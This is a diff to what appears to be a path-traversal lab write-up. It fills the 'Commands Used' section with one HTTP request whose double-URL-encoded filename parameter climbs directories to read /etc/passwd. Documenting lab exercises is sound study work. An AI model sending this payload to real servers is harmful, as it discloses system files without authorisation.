@@ -40,7 +40,7 @@ The `filename` parameter is processed by multiple decoding steps, allowing doubl
 ## 🧱 Commands Used
 
 ```http
-<!-- Add the command you used here -->
+GET /image?filename=%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd HTTP/2
 ```
 
 ---
